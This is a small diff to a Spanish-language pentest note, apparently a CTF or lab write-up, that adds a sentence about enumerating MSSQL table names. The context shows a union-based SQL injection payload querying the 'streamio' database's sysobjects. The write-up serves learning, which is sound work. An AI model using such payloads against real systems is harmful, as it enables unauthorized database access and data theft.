@@ -187,6 +187,8 @@ recordemos que podemos interactuar bajo la posición numero 2 y 3 en este caso y
 ![[Pasted image 20240514145156.png]]
 
 ### MSSQL List Tables
+de esta manera usando la query hemos logrado enumerar el nombre de las tablas en la base de datos
 ```python 
 10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
 ```
+![[Pasted image 20240514145530.png]]
